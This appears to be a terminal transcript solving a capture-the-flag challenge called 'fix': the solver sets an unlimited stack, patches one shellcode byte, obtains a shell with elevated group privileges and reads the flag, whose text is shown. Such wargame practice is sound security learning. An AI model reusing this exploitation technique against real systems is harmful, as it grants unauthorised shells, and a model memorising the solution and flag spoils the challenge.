fix@ubuntu:~$ ulimit -s unlimited
fix@ubuntu:~$ ./fix
What the hell is wrong with my shellcode??????
I just copied and pasted it from shell-storm.org :(
Can you fix it for me?
Tell me the byte index to be fixed : 15
Tell me the value to be patched : 92
get shell
$ id
uid=1049(fix) gid=1049(fix) egid=1050(fix_pwn) groups=1050(fix_pwn),1049(fix)
$ cat flag
Sorry for blaming shell-strom.org :) it was my ignorance!
